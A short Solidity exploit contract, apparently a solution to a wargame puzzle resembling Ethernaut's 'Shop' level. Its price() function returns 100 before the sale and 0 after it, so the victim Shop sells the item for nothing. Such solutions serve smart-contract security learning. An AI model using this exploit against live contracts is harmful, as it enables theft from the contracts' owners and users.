pragma solidity ^0.6.0;

import './Buyer.sol';

contract ShopAttack is Buyer {

    function price() external view override returns (uint) {

        bool isSold = Shop(msg.sender).isSold();

        assembly {
            let result

            switch isSold
            case 1 {
                result := 0
            }
            default {
                result := 100
            }
            mstore(0x0, result)
            return(0x0, 32)
        }
    }

    function attack(address _victim) public {
        Shop(_victim).buy();
    }

}